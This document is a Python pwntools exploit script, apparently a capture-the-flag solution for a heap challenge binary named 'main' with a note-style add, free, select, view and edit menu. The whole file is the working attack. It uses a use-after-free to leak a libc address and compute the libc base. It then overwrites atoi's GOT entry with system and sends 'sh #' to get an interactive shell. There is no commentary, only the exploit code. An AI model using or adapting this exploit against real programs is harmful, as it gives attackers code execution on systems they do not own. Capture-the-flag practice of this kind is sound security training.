from pwn import *
libc=ELF('./main').libc

target=process('./main')
def init(option):	
	print(target.recvuntil("Your choice: "))
	target.sendline(str(option))
	
def add(name,nums):
	init(1)
	print(target.recvuntil("name: "))
	target.send(name)
	for num in nums:
		print(target.recv())
		target.sendline(str(num))

def free(index):
	init(2)
	print(target.recvuntil("index: "))
	target.sendline(str(index))

def select(index):
	init(3)
	print(target.recvuntil("index: "))
	target.sendline(str(index))
	
def view():
	init(5)
	print(target.recvuntil("Name: "))
	leak=target.recvline().strip("\n")
	return leak

def editname(name):
	init(4)
	init(1)
	target.sendline(name)
 
nums=[1,1,1,1]
add("A"*0x90+"\n",nums)#0
add("A"*0x60+"\n",nums)#1
add("A"*0xf0+"\n",nums)#2
select(0)
free(0)#f0
leak=u64(view().ljust(8,"\x00"))
libc_base=leak-0x3c4b78
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
libc_system=libc_base+libc.symbols["system"]
print(hex(libc_base))
free(2)#f2
atoigot=0x603110
add("A"*16+p64(atoigot)+"\n",nums)
editname(p64(libc_system))
target.sendline("sh #")
	

target.interactive()





